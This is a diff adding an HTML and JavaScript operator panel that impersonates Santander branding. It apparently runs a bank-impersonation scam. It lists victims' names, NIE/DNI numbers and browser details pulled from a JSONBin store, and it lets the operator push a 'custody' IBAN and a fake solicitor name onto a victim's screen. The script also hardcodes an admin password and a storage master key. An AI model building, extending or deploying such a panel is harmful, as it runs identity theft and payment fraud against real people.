@@ -1,0 +1,687 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Santander · Panel de Control</title>
+  <link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Orbitron:wght@400;700;900&display=swap" rel="stylesheet">
+  <style>
+    :root {
+      --green: #00ff41;
+      --green-dim: #00cc33;
+      --green-dark: #003d0f;
+      --green-glow: rgba(0,255,65,.18);
+      --bg: #000;
+      --bg2: #050f05;
+      --bg3: #0a1a0a;
+      --border: #00ff4133;
+      --red: #ff4444;
+      --yellow: #ffcc00;
+      --blue: #00aaff;
+      --font: 'Share Tech Mono', monospace;
+      --font-title: 'Orbitron', monospace;
+    }
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+    html, body { height: 100%; background: var(--bg); color: var(--green); font-family: var(--font); overflow-x: hidden; }
+
+    /* ── SCANLINES EFFECT ── */
+    body::before {
+      content: '';
+      position: fixed; inset: 0; z-index: 9998; pointer-events: none;
+      background: repeating-linear-gradient(0deg, transparent, transparent 2px, rgba(0,0,0,.08) 2px, rgba(0,0,0,.08) 4px);
+    }
+
+    /* ── LOGIN SCREEN ── */
+    #login-screen {
+      position: fixed; inset: 0; z-index: 9999;
+      background: #000;
+      display: flex; flex-direction: column; align-items: center; justify-content: center;
+      padding: 20px;
+    }
+    .login-box {
+      border: 1px solid var(--green);
+      border-radius: 4px;
+      padding: 40px 48px;
+      max-width: 420px;
+      width: 100%;
+      background: var(--bg2);
+      box-shadow: 0 0 40px var(--green-glow), inset 0 0 20px rgba(0,255,65,.03);
+      text-align: center;
+    }
+    .login-logo {
+      font-family: var(--font-title);
+      font-size: 22px;
+      font-weight: 900;
+      color: var(--green);
+      letter-spacing: 4px;
+      margin-bottom: 6px;
+      text-shadow: 0 0 20px var(--green);
+    }
+    .login-sub { font-size: 11px; color: #00aa22; letter-spacing: 2px; margin-bottom: 32px; }
+    .login-label { font-size: 11px; color: #00aa22; letter-spacing: 1.5px; text-align: left; display: block; margin-bottom: 6px; }
+    .login-input {
+      width: 100%;
+      background: #000;
+      border: 1px solid var(--green);
+      color: var(--green);
+      font-family: var(--font);
+      font-size: 15px;
+      padding: 12px 14px;
+      border-radius: 3px;
+      outline: none;
+      margin-bottom: 20px;
+      letter-spacing: 2px;
+    }
+    .login-input:focus { box-shadow: 0 0 12px var(--green-glow); border-color: var(--green); }
+    .login-btn {
+      width: 100%;
+      background: transparent;
+      border: 1px solid var(--green);
+      color: var(--green);
+      font-family: var(--font-title);
+      font-size: 13px;
+      font-weight: 700;
+      letter-spacing: 3px;
+      padding: 13px;
+      cursor: pointer;
+      border-radius: 3px;
+      transition: all .2s;
+      text-transform: uppercase;
+    }
+    .login-btn:hover { background: var(--green-glow); box-shadow: 0 0 20px var(--green-glow); }
+    .login-error { color: var(--red); font-size: 12px; margin-top: 12px; display: none; }
+    .blink { animation: blink .8s step-end infinite; }
+    @keyframes blink { 50% { opacity: 0; } }
+
+    /* ── MAIN PANEL ── */
+    #main-panel { display: none; min-height: 100vh; }
+
+    /* TOP BAR */
+    .topbar {
+      background: var(--bg2);
+      border-bottom: 1px solid var(--border);
+      padding: 10px 24px;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      position: sticky; top: 0; z-index: 100;
+    }
+    .topbar-title { font-family: var(--font-title); font-size: 14px; font-weight: 900; letter-spacing: 3px; color: var(--green); text-shadow: 0 0 15px var(--green); }
+    .topbar-title span { color: #00aa22; font-size: 11px; font-weight: 400; margin-left: 10px; letter-spacing: 1px; }
+    .topbar-right { display: flex; align-items: center; gap: 20px; font-size: 11px; color: #00aa22; }
+    .status-dot { width: 8px; height: 8px; border-radius: 50%; background: var(--green); box-shadow: 0 0 8px var(--green); display: inline-block; animation: pulse-dot 1.5s ease-in-out infinite; }
+    @keyframes pulse-dot { 0%,100%{opacity:1;transform:scale(1)} 50%{opacity:.5;transform:scale(.8)} }
+    .btn-logout { background: transparent; border: 1px solid #ff444466; color: var(--red); font-family: var(--font); font-size: 11px; padding: 5px 12px; cursor: pointer; border-radius: 2px; letter-spacing: 1px; }
+    .btn-logout:hover { background: rgba(255,68,68,.1); }
+
+    /* LAYOUT */
+    .panel-layout { display: grid; grid-template-columns: 1fr 380px; gap: 0; min-height: calc(100vh - 49px); }
+    @media (max-width: 900px) { .panel-layout { grid-template-columns: 1fr; } }
+
+    /* LEFT: SESSIONS LIST */
+    .sessions-panel { border-right: 1px solid var(--border); padding: 20px; overflow-y: auto; }
+    .panel-header { display: flex; align-items: center; justify-content: space-between; margin-bottom: 16px; }
+    .panel-title { font-family: var(--font-title); font-size: 12px; font-weight: 700; letter-spacing: 2px; color: var(--green); }
+    .badge-count { background: var(--green); color: #000; font-size: 11px; font-weight: 700; padding: 2px 8px; border-radius: 10px; font-family: var(--font); }
+    .refresh-btn { background: transparent; border: 1px solid var(--border); color: #00aa22; font-family: var(--font); font-size: 11px; padding: 4px 10px; cursor: pointer; border-radius: 2px; letter-spacing: 1px; }
+    .refresh-btn:hover { border-color: var(--green); color: var(--green); }
+
+    /* SESSION ROW */
+    .session-row {
+      border: 1px solid var(--border);
+      border-radius: 4px;
+      padding: 14px 16px;
+      margin-bottom: 10px;
+      background: var(--bg3);
+      cursor: pointer;
+      transition: all .2s;
+      position: relative;
+    }
+    .session-row:hover { border-color: var(--green); box-shadow: 0 0 12px var(--green-glow); }
+    .session-row.selected { border-color: var(--green); background: rgba(0,255,65,.05); box-shadow: 0 0 16px var(--green-glow); }
+    .session-row.status-ready { border-color: #00aa22; }
+    .session-row.status-new { border-left: 3px solid var(--yellow); }
+    .sr-line { font-size: 12px; line-height: 1.8; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
+    .sr-line .lbl { color: #00aa22; }
+    .sr-line .val { color: var(--green); }
+    .sr-status {
+      position: absolute; top: 10px; right: 12px;
+      font-size: 10px; font-weight: 700; letter-spacing: 1px;
+      padding: 2px 8px; border-radius: 2px;
+    }
+    .sr-status.pending { background: rgba(255,204,0,.15); color: var(--yellow); border: 1px solid rgba(255,204,0,.3); }
+    .sr-status.ready   { background: rgba(0,255,65,.12); color: var(--green); border: 1px solid rgba(0,255,65,.3); }
+    .sr-time { font-size: 10px; color: #005510; margin-top: 4px; }
+
+    .no-sessions {
+      text-align: center;
+      padding: 60px 20px;
+      color: #005510;
+      font-size: 13px;
+      line-height: 2;
+    }
+    .no-sessions .big { font-size: 32px; margin-bottom: 12px; }
+
+    /* RIGHT: ACTION PANEL */
+    .action-panel { padding: 20px; background: var(--bg2); }
+    .action-title { font-family: var(--font-title); font-size: 12px; font-weight: 700; letter-spacing: 2px; color: var(--green); margin-bottom: 16px; }
+
+    .selected-info {
+      border: 1px solid var(--border);
+      border-radius: 4px;
+      padding: 14px 16px;
+      background: var(--bg3);
+      margin-bottom: 16px;
+      font-size: 12px;
+      line-height: 2;
+    }
+    .selected-info .lbl { color: #00aa22; }
+    .selected-info .val { color: var(--green); }
+    .no-selected { color: #005510; font-size: 12px; text-align: center; padding: 30px 0; line-height: 2; }
+
+    .form-group-admin { margin-bottom: 14px; }
+    .form-group-admin label { display: block; font-size: 10px; color: #00aa22; letter-spacing: 1.5px; margin-bottom: 5px; text-transform: uppercase; }
+    .admin-input {
+      width: 100%;
+      background: #000;
+      border: 1px solid var(--border);
+      color: var(--green);
+      font-family: var(--font);
+      font-size: 13px;
+      padding: 10px 12px;
+      border-radius: 3px;
+      outline: none;
+      letter-spacing: 1px;
+    }
+    .admin-input:focus { border-color: var(--green); box-shadow: 0 0 8px var(--green-glow); }
+    .admin-input::placeholder { color: #003d0f; }
+
+    .btn-send {
+      width: 100%;
+      background: transparent;
+      border: 1px solid var(--green);
+      color: var(--green);
+      font-family: var(--font-title);
+      font-size: 12px;
+      font-weight: 700;
+      letter-spacing: 2px;
+      padding: 13px;
+      cursor: pointer;
+      border-radius: 3px;
+      transition: all .2s;
+      text-transform: uppercase;
+      margin-top: 6px;
+    }
+    .btn-send:hover { background: var(--green-glow); box-shadow: 0 0 20px var(--green-glow); }
+    .btn-send:disabled { opacity: .3; cursor: not-allowed; }
+
+    .btn-delete {
+      width: 100%;
+      background: transparent;
+      border: 1px solid var(--red);
+      color: var(--red);
+      font-family: var(--font-title);
+      font-size: 11px;
+      font-weight: 700;
+      letter-spacing: 2px;
+      padding: 10px;
+      cursor: pointer;
+      border-radius: 3px;
+      transition: all .2s;
+      text-transform: uppercase;
+      margin-top: 8px;
+    }
+    .btn-delete:hover { background: rgba(255,68,68,.1); box-shadow: 0 0 16px rgba(255,68,68,.2); }
+    .btn-delete:disabled { opacity: .3; cursor: not-allowed; }
+
+    .send-result {
+      margin-top: 12px;
+      padding: 10px 14px;
+      border-radius: 3px;
+      font-size: 12px;
+      display: none;
+    }
+    .send-result.ok  { background: rgba(0,255,65,.08); border: 1px solid rgba(0,255,65,.3); color: var(--green); }
+    .send-result.err { background: rgba(255,68,68,.08); border: 1px solid rgba(255,68,68,.3); color: var(--red); }
+
+    /* DIVIDER */
+    .divider { border: none; border-top: 1px solid var(--border); margin: 16px 0; }
+
+    /* LOG */
+    .log-box {
+      border: 1px solid var(--border);
+      border-radius: 4px;
+      background: #000;
+      padding: 12px;
+      font-size: 11px;
+      color: #00aa22;
+      max-height: 160px;
+      overflow-y: auto;
+      line-height: 1.7;
+    }
+    .log-entry { border-bottom: 1px solid #001a00; padding: 2px 0; }
+    .log-entry .log-time { color: #005510; }
+    .log-entry .log-ok   { color: var(--green); }
+    .log-entry .log-err  { color: var(--red); }
+    .log-entry .log-info { color: var(--blue); }
+
+    /* STATS */
+    .stats-row { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin-bottom: 16px; }
+    .stat-box { border: 1px solid var(--border); border-radius: 4px; padding: 12px; background: var(--bg3); text-align: center; }
+    .stat-num { font-family: var(--font-title); font-size: 24px; font-weight: 900; color: var(--green); text-shadow: 0 0 15px var(--green); }
+    .stat-lbl { font-size: 10px; color: #00aa22; letter-spacing: 1px; margin-top: 4px; }
+
+    /* SOUND INDICATOR */
+    .sound-toggle {
+      background: transparent;
+      border: 1px solid var(--border);
+      color: #00aa22;
+      font-family: var(--font);
+      font-size: 11px;
+      padding: 4px 10px;
+      cursor: pointer;
+      border-radius: 2px;
+      letter-spacing: 1px;
+    }
+    .sound-toggle.on { border-color: var(--green); color: var(--green); }
+
+    /* SCROLLBAR */
+    ::-webkit-scrollbar { width: 4px; }
+    ::-webkit-scrollbar-track { background: #000; }
+    ::-webkit-scrollbar-thumb { background: #00ff4155; border-radius: 2px; }
+    ::-webkit-scrollbar-thumb:hover { background: var(--green); }
+  </style>
+</head>
+<body>
+
+<!-- ══ LOGIN SCREEN ══ -->
+<div id="login-screen">
+  <div class="login-box">
+    <div class="login-logo">SANTANDER</div>
+    <div class="login-sub">▸ PANEL DE CONTROL SEGURO ◂</div>
+    <label class="login-label">▸ CONTRASEÑA DE ACCESO</label>
+    <input type="password" class="login-input" id="loginPass" placeholder="••••••••••••" autocomplete="off">
+    <button class="login-btn" onclick="doLogin()">[ ACCEDER AL SISTEMA ]</button>
+    <div class="login-error" id="loginError">⚠ ACCESO DENEGADO — CONTRASEÑA INCORRECTA</div>
+    <div style="margin-top:24px;font-size:10px;color:#003d0f;letter-spacing:1px;">
+      SISTEMA PROTEGIDO · ACCESO RESTRINGIDO<br>
+      <span class="blink">█</span> TODOS LOS ACCESOS SON REGISTRADOS
+    </div>
+  </div>
+</div>
+
+<!-- ══ MAIN PANEL ══ -->
+<div id="main-panel">
+
+  <!-- TOP BAR -->
+  <div class="topbar">
+      <div class="topbar-title">SANTANDER <span>▸ PANEL DE CONTROL v2.6</span>
+    </div>
+    <div style="font-family:var(--font-title);font-size:11px;color:#00aa22;letter-spacing:3px;text-align:center;opacity:.7;">▸ SISTEMA DE <span style="color:var(--green);font-weight:900;text-shadow:0 0 10px var(--green);">RININO</span> ◂</div>
+    <div class="topbar-right">
+      <span><span class="status-dot"></span> SISTEMA ACTIVO</span>
+      <span id="clockDisplay">--:--:--</span>
+      <button class="sound-toggle on" id="soundBtn" onclick="toggleSound()">🔊 SONIDO</button>
+      <button class="btn-logout" onclick="doLogout()">[ SALIR ]</button>
+    </div>
+  </div>
+
+  <div class="panel-layout">
+
+    <!-- ══ LEFT: SESSIONS ══ -->
+    <div class="sessions-panel">
+      <div class="panel-header">
+        <span class="panel-title">▸ SOLICITUDES RECIBIDAS</span>
+        <div style="display:flex;gap:8px;align-items:center;">
+          <span class="badge-count" id="sessionCount">0</span>
+          <button class="refresh-btn" onclick="loadSessions()">⟳ ACTUALIZAR</button>
+        </div>
+      </div>
+
+      <!-- STATS -->
+      <div class="stats-row">
+        <div class="stat-box">
+          <div class="stat-num" id="statTotal">0</div>
+          <div class="stat-lbl">TOTAL</div>
+        </div>
+        <div class="stat-box">
+          <div class="stat-num" id="statPending" style="color:var(--yellow);text-shadow:0 0 15px var(--yellow);">0</div>
+          <div class="stat-lbl">PENDIENTES</div>
+        </div>
+      </div>
+
+      <div id="sessionsList">
+        <div class="no-sessions">
+          <div class="big">📭</div>
+          Esperando solicitudes...<br>
+          <span style="font-size:10px;color:#003d0f;">Actualización automática cada 5 segundos</span>
+        </div>
+      </div>
+    </div>
+
+    <!-- ══ RIGHT: ACTION PANEL ══ -->
+    <div class="action-panel">
+      <div class="action-title">▸ ENVIAR DATOS AL USUARIO</div>
+
+      <div id="selectedInfo">
+        <div class="no-selected">
+          ← Selecciona una solicitud<br>de la lista para gestionarla
+        </div>
+      </div>
+
+      <div id="sendForm" style="display:none;">
+        <hr class="divider">
+        <div class="form-group-admin">
+          <label>▸ IBAN DE CUSTODIA</label>
+          <input type="text" class="admin-input" id="ibanInput" placeholder="ES00 0000 0000 0000 0000 0000" maxlength="34" oninput="formatIban(this)">
+        </div>
+        <div class="form-group-admin">
+          <label>▸ NOMBRE DEL PROCURADOR</label>
+          <input type="text" class="admin-input" id="procNombreInput" placeholder="Nombre">
+        </div>
+        <div class="form-group-admin">
+          <label>▸ APELLIDOS DEL PROCURADOR</label>
+          <input type="text" class="admin-input" id="procApellidosInput" placeholder="Apellidos">
+        </div>
+        <button class="btn-send" id="sendBtn" onclick="sendData()">
+          ▸ ENVIAR AL USUARIO ◂
+        </button>
+        <div class="send-result" id="sendResult"></div>
+      </div>
+      <button class="btn-delete" id="deleteBtn" onclick="deleteSession()" style="display:none;margin-top:12px;">
+        ✕ ELIMINAR SOLICITUD
+      </button>
+
+      <hr class="divider">
+      <div class="action-title" style="margin-bottom:8px;">▸ LOG DEL SISTEMA</div>
+      <div class="log-box" id="logBox">
+        <div class="log-entry"><span class="log-time">[SISTEMA]</span> <span class="log-info">Panel iniciado. Conectando con JSONBin...</span></div>
+      </div>
+    </div>
+
+  </div>
+</div>
+
+<script>
+  // ── CONFIG ──
+  const ADMIN_PASSWORD = 'SantanderAdmin2026!';
+  const BIN_ID         = '69c501f6c3097a1dd5605779';
+  const MASTER_KEY     = '$2a$10$RoiwGd894wsPzcL0d6AYtegWuH4z7zN1P09knFoJ/sP6fOaecTzm.';
+  const API_BASE       = 'https://api.jsonbin.io/v3/b';
+
+  let sessions        = [];
+  let selectedId      = null;
+  let pollInterval    = null;
+  let soundEnabled    = true;
+  let prevCount       = 0;
+  let audioCtx        = null;
+
+  // ── CLOCK ──
+  function updateClock() {
+    const now = new Date();
+    document.getElementById('clockDisplay').textContent =
+      now.toLocaleTimeString('es-ES', { hour12: false });
+  }
+  setInterval(updateClock, 1000);
+  updateClock();
+
+  // ── LOGIN ──
+  document.getElementById('loginPass').addEventListener('keydown', e => {
+    if (e.key === 'Enter') doLogin();
+  });
+
+  function doLogin() {
+    const pass = document.getElementById('loginPass').value;
+    if (pass === ADMIN_PASSWORD) {
+      document.getElementById('login-screen').style.display = 'none';
+      document.getElementById('main-panel').style.display = 'block';
+      addLog('info', 'Acceso autorizado. Cargando sesiones...');
+      loadSessions();
+      pollInterval = setInterval(loadSessions, 5000);
+    } else {
+      document.getElementById('loginError').style.display = 'block';
+      document.getElementById('loginPass').value = '';
+      addLog('err', 'Intento de acceso fallido.');
+    }
+  }
+
+  function doLogout() {
+    clearInterval(pollInterval);
+    document.getElementById('login-screen').style.display = 'flex';
+    document.getElementById('main-panel').style.display = 'none';
+    document.getElementById('loginPass').value = '';
+    selectedId = null;
+  }
+
+  // ── LOAD SESSIONS ──
+  async function loadSessions() {
+    try {
+      const res  = await fetch(`${API_BASE}/${BIN_ID}/latest`, {
+        headers: { 'X-Master-Key': MASTER_KEY }
+      });
+      const data = await res.json();
+      sessions = (data.record && data.record.sessions) ? data.record.sessions : [];
+
+      // Notifica sonora nuova sessione
+      if (sessions.length > prevCount && prevCount > 0) {
+        playAlert();
+        addLog('ok', `Nueva solicitud recibida. Total: ${sessions.length}`);
+      }
+      prevCount = sessions.length;
+
+      renderSessions();
+      updateStats();
+    } catch(err) {
+      addLog('err', 'Error al cargar sesiones: ' + err.message);
+    }
+  }
+
+  function renderSessions() {
+    const list = document.getElementById('sessionsList');
+    document.getElementById('sessionCount').textContent = sessions.length;
+
+    if (sessions.length === 0) {
+      list.innerHTML = `<div class="no-sessions"><div class="big">📭</div>Esperando solicitudes...<br><span style="font-size:10px;color:#003d0f;">Actualización automática cada 5 segundos</span></div>`;
+      return;
+    }
+
+    // Ordina: pending prima, poi per timestamp desc
+    const sorted = [...sessions].sort((a, b) => {
+      if (a.status === 'pending' && b.status !== 'pending') return -1;
+      if (b.status === 'pending' && a.status !== 'pending') return 1;
+      return 0;
+    });
+
+    list.innerHTML = sorted.map(s => `
+      <div class="session-row ${s.status === 'ready' ? 'status-ready' : 'status-new'} ${selectedId === s.id ? 'selected' : ''}"
+           onclick="selectSession('${s.id}')">
+        <span class="sr-status ${s.status}">${s.status === 'ready' ? '✓ ENVIADO' : '⏳ PENDIENTE'}</span>
+        <div class="sr-line"><span class="lbl">ID&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="val">${s.id}</span></div>
+        <div class="sr-line"><span class="lbl">NOMBRE&nbsp;</span><span class="val">${s.nombre} ${s.apellidos}</span></div>
+        <div class="sr-line"><span class="lbl">NIE/DNI </span><span class="val">${s.nie}</span></div>
+        ${s.status === 'ready' ? `<div class="sr-line"><span class="lbl">IBAN&nbsp;&nbsp;&nbsp;</span><span class="val">${s.iban}</span></div>` : ''}
+        <div class="sr-time">⏱ ${s.timestamp} &nbsp;|&nbsp; ${(s.ua||'').substring(0,60)}</div>
+      </div>
+    `).join('');
+  }
+
+  function updateStats() {
+    const total   = sessions.length;
+    const pending = sessions.filter(s => s.status === 'pending').length;
+    document.getElementById('statTotal').textContent   = total;
+    document.getElementById('statPending').textContent = pending;
+  }
+
+  // ── SELECT SESSION ──
+  function selectSession(id) {
+    selectedId = id;
+    const s = sessions.find(x => x.id === id);
+    if (!s) return;
+
+    renderSessions(); // aggiorna selezione visiva
+
+    const infoHtml = `
+      <div class="selected-info">
+        <div class="sr-line"><span class="lbl">▸ SOLICITANTE</span></div>
+        <div class="sr-line"><span class="lbl">NOMBRE&nbsp;&nbsp;&nbsp;</span><span class="val">${s.nombre} ${s.apellidos}</span></div>
+        <div class="sr-line"><span class="lbl">NIE/DNI&nbsp;&nbsp;</span><span class="val">${s.nie}</span></div>
+        <div class="sr-line"><span class="lbl">ESTADO&nbsp;&nbsp;&nbsp;</span><span class="val" style="color:${s.status==='ready'?'var(--green)':'var(--yellow)'};">${s.status.toUpperCase()}</span></div>
+        <div class="sr-line"><span class="lbl">TIMESTAMP</span><span class="val">${s.timestamp}</span></div>
+        ${s.iban ? `<div class="sr-line"><span class="lbl">IBAN&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="val">${s.iban}</span></div>` : ''}
+        ${s.proc_nombre ? `<div class="sr-line"><span class="lbl">PROCURADOR</span><span class="val">${s.proc_nombre} ${s.proc_apellidos}</span></div>` : ''}
+      </div>
+    `;
+    document.getElementById('selectedInfo').innerHTML = infoHtml;
+    document.getElementById('sendForm').style.display = s.status === 'pending' ? 'block' : 'none';
+
+    if (s.status === 'ready') {
+      document.getElementById('selectedInfo').innerHTML += `<div style="text-align:center;padding:16px;color:var(--green);font-size:12px;">✓ DATOS YA ENVIADOS A ESTE USUARIO</div>`;
+    }
+    // Mostra sempre il bottone elimina quando una sessione è selezionata
+    document.getElementById('deleteBtn').style.display = 'block';
+  }
+
+  // ── SEND DATA ──
+  async function sendData() {
+    const iban          = document.getElementById('ibanInput').value.replace(/\s/g, '').toUpperCase();
+    const procNombre    = document.getElementById('procNombreInput').value.trim();
+    const procApellidos = document.getElementById('procApellidosInput').value.trim();
+
+    if (!iban || iban.length < 15) { showSendResult('err', '⚠ IBAN no válido.'); return; }
+    if (!procNombre || !procApellidos) { showSendResult('err', '⚠ Introduce nombre y apellidos del procurador.'); return; }
+    if (!selectedId) { showSendResult('err', '⚠ No hay sesión seleccionada.'); return; }
+
+    document.getElementById('sendBtn').disabled = true;
+    document.getElementById('sendBtn').textContent = '▸ ENVIANDO... ◂';
+
+    try {
+      // Carica sessioni aggiornate
+      const res  = await fetch(`${API_BASE}/${BIN_ID}/latest`, { headers: { 'X-Master-Key': MASTER_KEY } });
+      const data = await res.json();
+      const updatedSessions = data.record.sessions || [];
+
+      // Aggiorna la sessione selezionata
+      const idx = updatedSessions.findIndex(s => s.id === selectedId);
+      if (idx === -1) { showSendResult('err', '⚠ Sesión no encontrada.'); return; }
+
+      updatedSessions[idx].iban          = iban;
+      updatedSessions[idx].proc_nombre    = procNombre;
+      updatedSessions[idx].proc_apellidos = procApellidos;
+      updatedSessions[idx].status         = 'ready';
+
+      // Salva
+      await fetch(`${API_BASE}/${BIN_ID}`, {
+        method: 'PUT',
+        headers: { 'Content-Type': 'application/json', 'X-Master-Key': MASTER_KEY },
+        body: JSON.stringify({ sessions: updatedSessions })
+      });
+
+      showSendResult('ok', `✓ DATOS ENVIADOS — El usuario verá el IBAN y el procurador en su pantalla.`);
+      addLog('ok', `Datos enviados a ${updatedSessions[idx].nombre} ${updatedSessions[idx].apellidos} | IBAN: ${iban}`);
+
+      // Aggiorna lista
+      await loadSessions();
+      document.getElementById('sendForm').style.display = 'none';
+
+    } catch(err) {
+      showSendResult('err', '⚠ Error al enviar: ' + err.message);
+      addLog('err', 'Error al enviar datos: ' + err.message);
+    }
+
+    document.getElementById('sendBtn').disabled = false;
+    document.getElementById('sendBtn').textContent = '▸ ENVIAR AL USUARIO ◂';
+  }
+
+  // ── DELETE SESSION ──
+  async function deleteSession() {
+    if (!selectedId) { showSendResult('err', '⚠ Nessuna sessione selezionata.'); return; }
+    const s = sessions.find(x => x.id === selectedId);
+    const name = s ? `${s.nombre} ${s.apellidos}` : selectedId;
+    if (!confirm(`¿Eliminar la solicitud de ${name}?\nEsta acción no se puede deshacer.`)) return;
+
+    const btn = document.getElementById('deleteBtn');
+    btn.disabled = true;
+    btn.textContent = '✕ ELIMINANDO...';
+
+    try {
+      const res  = await fetch(`${API_BASE}/${BIN_ID}/latest`, { headers: { 'X-Master-Key': MASTER_KEY } });
+      const data = await res.json();
+      const updatedSessions = (data.record.sessions || []).filter(x => x.id !== selectedId);
+
+      await fetch(`${API_BASE}/${BIN_ID}`, {
+        method: 'PUT',
+        headers: { 'Content-Type': 'application/json', 'X-Master-Key': MASTER_KEY },
+        body: JSON.stringify({ sessions: updatedSessions })
+      });
+
+      addLog('ok', `Solicitud eliminada: ${name}`);
+      showSendResult('ok', `✓ SOLICITUD ELIMINADA — ${name}`);
+      selectedId = null;
+      document.getElementById('selectedInfo').innerHTML = `<div class="no-selected">← Selecciona una solicitud<br>de la lista para gestionarla</div>`;
+      document.getElementById('sendForm').style.display = 'none';
+      document.getElementById('deleteBtn').style.display = 'none';
+      await loadSessions();
+    } catch(err) {
+      showSendResult('err', '⚠ Error al eliminar: ' + err.message);
+      addLog('err', 'Error al eliminar: ' + err.message);
+    }
+
+    btn.disabled = false;
+    btn.textContent = '✕ ELIMINAR SOLICITUD';
+  }
+
+  function showSendResult(type, msg) {
+    const el = document.getElementById('sendResult');
+    el.className = 'send-result ' + type;
+    el.textContent = msg;
+    el.style.display = 'block';
+    setTimeout(() => { el.style.display = 'none'; }, 5000);
+  }
+
+  // ── IBAN FORMATTER ──
+  function formatIban(input) {
+    let val = input.value.replace(/[^A-Z0-9]/gi, '').toUpperCase();
+    val = val.match(/.{1,4}/g)?.join(' ') || val;
+    input.value = val;
+  }
+
+  // ── LOG ──
+  function addLog(type, msg) {
+    const box = document.getElementById('logBox');
+    const time = new Date().toLocaleTimeString('es-ES', { hour12: false });
+    const cls  = type === 'ok' ? 'log-ok' : type === 'err' ? 'log-err' : 'log-info';
+    const entry = document.createElement('div');
+    entry.className = 'log-entry';
+    entry.innerHTML = `<span class="log-time">[${time}]</span> <span class="${cls}">${msg}</span>`;
+    box.insertBefore(entry, box.firstChild);
+    if (box.children.length > 50) box.removeChild(box.lastChild);
+  }
+
+  // ── SOUND ──
+  function playAlert() {
+    if (!soundEnabled) return;
+    try {
+      if (!audioCtx) audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+      const osc = audioCtx.createOscillator();
+      const gain = audioCtx.createGain();
+      osc.connect(gain);
+      gain.connect(audioCtx.destination);
+      osc.frequency.setValueAtTime(880, audioCtx.currentTime);
+      osc.frequency.setValueAtTime(1100, audioCtx.currentTime + 0.1);
+      osc.frequency.setValueAtTime(880, audioCtx.currentTime + 0.2);
+      gain.gain.setValueAtTime(0.3, audioCtx.currentTime);
+      gain.gain.exponentialRampToValueAtTime(0.001, audioCtx.currentTime + 0.4);
+      osc.start(audioCtx.currentTime);
+      osc.stop(audioCtx.currentTime + 0.4);
+    } catch(e) {}
+  }
+
+  function toggleSound() {
+    soundEnabled = !soundEnabled;
+    const btn = document.getElementById('soundBtn');
+    btn.textContent = soundEnabled ? '🔊 SONIDO' : '🔇 MUDO';
+    btn.className   = 'sound-toggle ' + (soundEnabled ? 'on' : '');
+  }
+</script>
+</body>
+</html>
